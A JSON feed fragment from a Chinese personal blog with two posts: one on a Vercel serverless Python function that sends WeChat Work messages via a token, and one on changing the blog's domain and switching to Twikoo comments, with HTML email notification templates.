            "content_html": "<p><a href=\"https://vercel.com/\">Vercel</a>\n是一个用于前端框架和静态站点的平台，可以用来部署静态网站和 Serverless\n函数，功能强大，使用方便。</p>\n<p><a\nhref=\"https://developer.work.weixin.qq.com/\">企业微信</a>提供一系列的\nAPI 接口，可以通过企业微信应用或群机器人发送消息，而且企业微信接入了 <a\nhref=\"https://dev.mi.com/console/appservice/push.html\">MiPush</a>，在\nMIUI 系统上可以无后台接收消息。</p>\n<span id=\"more\"></span>\n<p>但是发送企业微信应用消息比较麻烦，要先通过<code>corpid</code>和<code>corpsecret</code>获取<code>access_token</code>，然后通过\nPOST 请求发送消息。所以我利用 Vercel 搭建了一个 Serverless\n函数，只需要一个<code>token</code>就可以发送消息，非常方便。</p>\n<h2 id=\"接口说明\">接口说明</h2>\n<p>请求地址为https://api.meancoder.xyz/push，参数如下：</p>\n<table>\n<thead>\n<tr class=\"header\">\n<th>参数</th>\n<th>必须</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr class=\"odd\">\n<td>token</td>\n<td>是</td>\n<td>在环境变量中设置的<code>TOKEN</code>，用于验证身份</td>\n</tr>\n<tr class=\"even\">\n<td>content</td>\n<td>是</td>\n<td>消息内容</td>\n</tr>\n<tr class=\"odd\">\n<td>msgtype</td>\n<td>否</td>\n<td><code>text</code>或<code>markdown</code>，默认为<code>text</code></td>\n</tr>\n<tr class=\"even\">\n<td>touser</td>\n<td>否</td>\n<td>指定接收消息的成员，默认为<code>Mean</code></td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"代码\">代码</h2>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> json</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.parse</span><br><span class=\"line\"><span class=\"keyword\">from</span> http.server <span class=\"keyword\">import</span> BaseHTTPRequestHandler</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">push</span>(<span class=\"params\">content, touser, msgtype</span>):</span><br><span class=\"line\">    params = &#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;corpid&#x27;</span>: os.environ[<span class=\"string\">&#x27;CORPID&#x27;</span>],</span><br><span class=\"line\">        <span class=\"string\">&#x27;corpsecret&#x27;</span>: os.environ[<span class=\"string\">&#x27;CORPSECRET&#x27;</span>]</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    access_token = json.loads(requests.get(</span><br><span class=\"line\">        <span class=\"string\">&#x27;https://qyapi.weixin.qq.com/cgi-bin/gettoken&#x27;</span>, params=params).text)[<span class=\"string\">&#x27;access_token&#x27;</span>]</span><br><span class=\"line\">    push_url = <span class=\"string\">&#x27;https://qyapi.weixin.qq.com/cgi-bin/message/send?access_token=&#x27;</span>+access_token</span><br><span class=\"line\">    data = &#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;msgtype&#x27;</span>: msgtype,</span><br><span class=\"line\">        <span class=\"string\">&#x27;agentid&#x27;</span>: os.environ[<span class=\"string\">&#x27;AGENTID&#x27;</span>],</span><br><span class=\"line\">        msgtype: &#123;</span><br><span class=\"line\">            <span class=\"string\">&#x27;content&#x27;</span>: content</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        <span class=\"string\">&#x27;touser&#x27;</span>: touser</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    response = requests.post(push_url, json=data)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> response.text</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">handler</span>(<span class=\"title class_ inherited__\">BaseHTTPRequestHandler</span>):</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">do_GET</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        errcode = <span class=\"number\">0</span></span><br><span class=\"line\">        errmsg = <span class=\"string\">&quot;ok&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">        content = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">        touser = <span class=\"string\">&quot;Mean&quot;</span></span><br><span class=\"line\">        msgtype = <span class=\"string\">&quot;text&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">        datas = urllib.parse.parse_qs(self.path.split(<span class=\"string\">&quot;?&quot;</span>)[<span class=\"number\">1</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&quot;token&quot;</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> datas:</span><br><span class=\"line\">            errcode = -<span class=\"number\">1</span></span><br><span class=\"line\">            errmsg = <span class=\"string\">&quot;no token&quot;</span></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> datas[<span class=\"string\">&quot;token&quot;</span>][<span class=\"number\">0</span>] != os.environ[<span class=\"string\">&quot;TOKEN&quot;</span>]:</span><br><span class=\"line\">            errcode = -<span class=\"number\">2</span></span><br><span class=\"line\">            errmsg = <span class=\"string\">&quot;invalid token&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&quot;content&quot;</span> <span class=\"keyword\">in</span> datas:</span><br><span class=\"line\">            content = datas[<span class=\"string\">&quot;content&quot;</span>][<span class=\"number\">0</span>]</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            errcode = -<span class=\"number\">3</span></span><br><span class=\"line\">            errmsg = <span class=\"string\">&quot;no content&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&quot;touser&quot;</span> <span class=\"keyword\">in</span> datas:</span><br><span class=\"line\">            touser = datas[<span class=\"string\">&quot;touser&quot;</span>][<span class=\"number\">0</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&quot;msgtype&quot;</span> <span class=\"keyword\">in</span> datas:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> datas[<span class=\"string\">&quot;msgtype&quot;</span>][<span class=\"number\">0</span>] <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> [<span class=\"string\">&quot;text&quot;</span>, <span class=\"string\">&quot;markdown&quot;</span>]:</span><br><span class=\"line\">                errcode = -<span class=\"number\">4</span></span><br><span class=\"line\">                errmsg = <span class=\"string\">&quot;invalid token&quot;</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                msgtype = datas[<span class=\"string\">&quot;msgtype&quot;</span>][<span class=\"number\">0</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> errcode == <span class=\"number\">0</span>:</span><br><span class=\"line\">            errmsg = push(content, touser, msgtype)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            errmsg = json.dumps(&#123;<span class=\"string\">&quot;errcode&quot;</span>: errcode, <span class=\"string\">&quot;errmsg&quot;</span>: errmsg&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">        self.send_response(<span class=\"number\">200</span>)</span><br><span class=\"line\">        self.send_header(<span class=\"string\">&#x27;Content-type&#x27;</span>, <span class=\"string\">&#x27;text/plain&#x27;</span>)</span><br><span class=\"line\">        self.end_headers()</span><br><span class=\"line\">        self.wfile.write(errmsg.encode())</span><br><span class=\"line\">        <span class=\"keyword\">return</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"重定向\">重定向</h2>\n<p>由于 api\n要放在<code>/api</code>路径下，默认是通过https://api.meancoder.xyz/api/push发送请求。如果在根目录配置<code>vercel.json</code>文件，就可以把<code>/api</code>重定向到根目录，就能直接通过https://api.meancoder.xyz/push发送请求了。</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">  <span class=\"attr\">&quot;rewrites&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">[</span></span><br><span class=\"line\">    <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;source&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;/:path*&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;destination&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;/api/:path*&quot;</span></span><br><span class=\"line\">    <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\">  <span class=\"punctuation\">]</span></span><br><span class=\"line\"><span class=\"punctuation\">&#125;</span></span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "Serverless"
            ]
        },
        {
            "id": "https://blog.meancoder.xyz/2022/change-domain-and-comment/",
            "url": "https://blog.meancoder.xyz/2022/change-domain-and-comment/",
            "title": "博客更换域名和评论系统",
            "date_published": "2022-02-04T11:36:04.000Z",
            "content_html": "<p>之前在考研，一直没时间更新博客。考完之后又一直懒得写，最近才开始恢复更新。这段时间博客网址换回了以前的www.meancoder.xyz，评论也换成了<a\nhref=\"https://twikoo.js.org/\">Twikoo</a>。</p>\n<span id=\"more\"></span>\n<h2 id=\"更换域名\">更换域名</h2>\n<p>最开始的 xyz\n域名只买了一年，当时活动只要一块钱。可惜以前不知道域名有什么用，那时候十年才一百多，没活动的话续费又很贵。后来又买了一年的\ntop 域名，但是还是比较喜欢 xyz 域名，所以等赎回期过后买了 5\n年，以后等有活动再多续几年。</p>\n<h2 id=\"更换评论系统\">更换评论系统</h2>\n<p>之前博客用的评论系统是<a\nhref=\"https://valine.js.org/\">Valine</a>，但是存在一些安全隐患，而且\nLeanCloud 会自动休眠(虽然我的博客也没人看)。所以评论系统换成了<a\nhref=\"https://twikoo.js.org/\">Twikoo</a>，后端用腾讯云开发部署，前端\nNexT 主题直接使用<code>hexo-next-twikoo</code>插件。</p>\n<hr />\n<p>最后附上自定义的邮件通知模板。</p>\n<div class=\"tabs\" id=\"自定义邮件通知模板\"><ul class=\"nav-tabs\"><li class=\"tab active\"><a href=\"#自定义邮件通知模板-1\">通知邮件模板</a></li><li class=\"tab\"><a href=\"#自定义邮件通知模板-2\">博主通知邮件模板</a></li></ul><div class=\"tab-content\"><div class=\"tab-pane active\" id=\"自定义邮件通知模板-1\"><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;extend header&quot;</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;background: #1e1f27; padding: 40px 20px;&quot;</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">div</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">class</span>=<span class=\"string\">&quot;extend-inner header-inner&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">style</span>=<span class=\"string\">&quot;max-width: 600px; margin: 0 auto;&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">  &gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">a</span></span></span><br><span class=\"line\"><span class=\"tag\">      <span class=\"attr\">href</span>=<span class=\"string\">&quot;$&#123;SITE_URL&#125;&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">      <span class=\"attr\">style</span>=<span class=\"string\">&quot;color: #fff; text-decoration: none;font-size:30px;font-weight:normal&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    &gt;</span></span><br><span class=\"line\">      $&#123;SITE_NAME&#125;</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;extend title&quot;</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;padding: 20px 20px; background: #f9f9f9;&quot;</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">div</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">class</span>=<span class=\"string\">&quot;extend-inner title-inner&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">style</span>=<span class=\"string\">&quot;max-width: 600px; margin: 0 auto;&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">  &gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">h1</span></span></span><br><span class=\"line\"><span class=\"tag\">      <span class=\"attr\">style</span>=<span class=\"string\">&quot;font-weight: 300; font-size: 1.4em; margin: 0.67em 0; line-height: 1.4;&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    &gt;</span></span><br><span class=\"line\">      $&#123;NICK&#125; 回复了您的评论</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;extend content&quot;</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;padding: 20px 20px;&quot;</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">div</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">class</span>=<span class=\"string\">&quot;extend-inner content-inner&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">style</span>=<span class=\"string\">&quot;max-width: 600px; margin: 0 auto;&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">  &gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">strong</span>&gt;</span>$&#123;PARENT_NICK&#125;<span class=\"tag\">&lt;/<span class=\"name\">strong</span>&gt;</span>，您曾在</span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">a</span></span></span><br><span class=\"line\"><span class=\"tag\">        <span class=\"attr\">href</span>=<span class=\"string\">&quot;$&#123;SITE_URL&#125;&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">        <span class=\"attr\">style</span>=<span class=\"string\">&quot;color: rgb(3,120,221);border-bottom: 1.0px solid rgb(3,120,221);text-decoration: none;margin-bottom: 2.0px;&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">        &gt;</span>$&#123;SITE_NAME&#125;&lt;/a</span><br><span class=\"line\">      &gt;</span><br><span class=\"line\">      上发布评论：</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span></span></span><br><span class=\"line\"><span class=\"tag\">      <span class=\"attr\">class</span>=<span class=\"string\">&quot;extend footer&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">      <span class=\"attr\">style</span>=<span class=\"string\">&quot;padding: 20px 20px; background: #eee; color: #666; font-size: 90%;&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    &gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">div</span></span></span><br><span class=\"line\"><span class=\"tag\">        <span class=\"attr\">class</span>=<span class=\"string\">&quot;extend-inner footer-inner&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">        <span class=\"attr\">style</span>=<span class=\"string\">&quot;max-width: 600px; margin: 0 auto;&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">      &gt;</span></span><br><span class=\"line\">        $&#123;PARENT_COMMENT&#125;</span><br><span class=\"line\">      <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">strong</span>&gt;</span>$&#123;NICK&#125;<span class=\"tag\">&lt;/<span class=\"name\">strong</span>&gt;</span> 回复：<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span></span></span><br><span class=\"line\"><span class=\"tag\">      <span class=\"attr\">class</span>=<span class=\"string\">&quot;extend footer&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">      <span class=\"attr\">style</span>=<span class=\"string\">&quot;padding: 20px 20px; background: #eee; color: #666; font-size: 90%;&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    &gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">div</span></span></span><br><span class=\"line\"><span class=\"tag\">        <span class=\"attr\">class</span>=<span class=\"string\">&quot;extend-inner footer-inner&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">        <span class=\"attr\">style</span>=<span class=\"string\">&quot;max-width: 600px; margin: 0 auto;&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">      &gt;</span></span><br><span class=\"line\">        $&#123;COMMENT&#125;</span><br><span class=\"line\">      <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">a</span></span></span><br><span class=\"line\"><span class=\"tag\">        <span class=\"attr\">href</span>=<span class=\"string\">&quot;$&#123;POST_URL&#125;&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">        <span class=\"attr\">style</span>=<span class=\"string\">&quot;color: rgb(3,120,221);border-bottom: 1.0px solid rgb(3,120,221);text-decoration: none;margin-bottom: 2.0px;&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">        &gt;</span>查看评论&lt;/a</span><br><span class=\"line\">      &gt;</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">hr</span></span></span><br><span class=\"line\"><span class=\"tag\">      <span class=\"attr\">style</span>=<span class=\"string\">&quot;display: block;height: 1.0px;border: 0;border-top: 5.0px solid rgb(238,238,238);margin: 1.0em 0;padding: 0;&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">p</span></span></span><br><span class=\"line\"><span class=\"tag\">      <span class=\"attr\">class</span>=<span class=\"string\">&quot;text-center shy&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">      <span class=\"attr\">style</span>=<span class=\"string\">&quot;color: rgb(153,153,153);text-align: center;&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    &gt;</span></span><br><span class=\"line\">      扫二维码，关注微信公众号</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">p</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;text-center&quot;</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;text-align: center;&quot;</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">img</span></span></span><br><span class=\"line\"><span class=\"tag\">        <span class=\"attr\">src</span>=<span class=\"string\">&quot;https://www.meancoder.xyz/images/wechat_channel.png&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">        <span class=\"attr\">style</span>=<span class=\"string\">&quot;max-width: 400px;width: 100%;&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">      /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">class</span>=<span class=\"string\">&quot;extend footer&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">style</span>=<span class=\"string\">&quot;padding: 20px 20px; background: #eee; color: #666; font-size: 90%;&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">div</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">class</span>=<span class=\"string\">&quot;extend-inner footer-inner&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">style</span>=<span class=\"string\">&quot;max-width: 600px; margin: 0 auto;&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">  &gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">      欢迎再次访问</span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;$&#123;SITE_URL&#125;&quot;</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;color: #444;&quot;</span>&gt;</span>$&#123;SITE_NAME&#125;&lt;/a</span><br><span class=\"line\">      &gt;，如果有疑问或其他想法，<span class=\"tag\">&lt;<span class=\"name\">a</span></span></span><br><span class=\"line\"><span class=\"tag\">        <span class=\"attr\">href</span>=<span class=\"string\">&quot;mailto:390602272@qq.com&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">        <span class=\"attr\">style</span>=<span class=\"string\">&quot;color: #444;&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">        &gt;</span>请与我联系&lt;/a</span><br><span class=\"line\">      &gt;。</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>本邮件由系统自动发出，请勿直接回复。<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure></div><div class=\"tab-pane\" id=\"自定义邮件通知模板-2\"><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br></pre></td><td class=\"code\"><pre><span 